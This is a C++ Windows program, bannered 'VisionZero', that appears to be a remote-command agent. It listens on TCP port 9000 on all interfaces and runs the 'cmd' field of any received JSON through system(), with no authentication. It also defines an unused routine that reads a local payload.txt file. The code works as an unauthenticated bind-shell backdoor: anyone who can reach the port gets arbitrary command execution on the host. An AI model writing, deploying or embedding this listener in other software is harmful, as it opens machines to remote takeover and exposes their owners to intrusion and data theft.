#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>

#include "rapidjson/document.h"

#pragma warning( disable : 4996)
#pragma comment(lib, "ws2_32.lib")

#define PORT 9000

std::string readPayload() {
    std::ifstream myfile;
    
    myfile.open("payload.txt");

    std::string contents;

    if (myfile.is_open()) {
        char mychar;
        while (myfile) {
            mychar = myfile.get();
            contents += mychar;
        }
    }

    return contents;
}

void executeCommandWithOutput(const std::string& command) {
    system(command.c_str());
}

int main() {
    std::cout << R"(

 __      ___     _             ______              
 \ \    / (_)   (_)           |___  /              
  \ \  / / _ ___ _  ___  _ __    / / ___ _ __ ___  
   \ \/ / | / __| |/ _ \| '_ \  / / / _ \ '__/ _ \ 
    \  /  | \__ \ | (_) | | | |/ /_|  __/ | | (_) |
     \/   |_|___/_|\___/|_| |_/_____\___|_|  \___/ 
                                                                                                                       
)" << '\n';

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[ERROR] WSAStartup failed" << std::endl;
        return 1;
    }

    // Create socket
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "[ERROR] Socket creation failed" << std::endl;
        WSACleanup();
        return 1;
    }

    // Set up server address information
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    // Bind the socket
    if (bind(serverSocket, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "[ERROR] Bind failed" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // Listen for incoming connections
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "[ERROR] Listen failed" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "[SUCCESS] Server is listening on port " << PORT << std::endl;

    while (true) {
        // Accept incoming connections
        sockaddr_in clientAddr;
        int clientAddrLen = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, reinterpret_cast<sockaddr*>(&clientAddr), &clientAddrLen);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "[ERROR] Accept failed\n";
            closesocket(serverSocket);
            WSACleanup();
            return 1;
        }

        std::cout << "[SUCCESS] Connection accepted from IP: " << inet_ntoa(clientAddr.sin_addr) << ", Port: " << ntohs(clientAddr.sin_port) << std::endl;

        // Receive JSON request
        char buffer[1024];
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived == SOCKET_ERROR) {
            std::cerr << "[ERROR] Receive failed\n";
            closesocket(clientSocket);
            continue;
        }

        // Check if connection was closed by the client
        if (bytesReceived == 0) {
            std::cout << "[INFO] Connection closed by the client\n";
            closesocket(clientSocket);
            continue;
        }

        // Null-terminate the received data
        buffer[bytesReceived] = '\0';

        // Print the entire received data for debugging
        std::cout << "[SUCCESS] Received data: " << buffer << std::endl;

        // Print the length of received data
        std::cout << "[SUCCESS] Received data length: " << bytesReceived << " bytes\n";

        // Parse JSON
        rapidjson::Document document;
        document.Parse(buffer);

        // Check if parsing was successful
        if (document.HasParseError()) {
            std::cerr << "[ERR] JSON parsing failed. Error code: " << document.GetParseError() << std::endl;
            // Additional error handling if needed
        }
        else {
            // Print the parsed JSON data
            std::cout << "[SUCCESS] Parsed JSON:\n" << buffer << std::endl;

            // Process the JSON data as needed
            // Example: Accessing a JSON member
            if (document.HasMember("cmd") && document.HasMember("msg")) {
                const rapidjson::Value& command = document["cmd"];
                const rapidjson::Value& message = document["msg"];
                if (command.IsString() && message.IsString()) {
                    std::string command_to_execute = command.GetString();
                    std::cout << "[SUCCESS] Running command: " << message.GetString() << std::endl;

                    // Run Command
                    executeCommandWithOutput(command_to_execute);
                }
                else {
                    std::cerr << "[ERROR] Not a string" << std::endl;
                }
            }
            else {
                std::cerr << "[ERROR] Key 'key' not found in the JSON" << std::endl;
            }
        }

        // Close the client socket
        closesocket(clientSocket);
    }

    // Clean up
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}
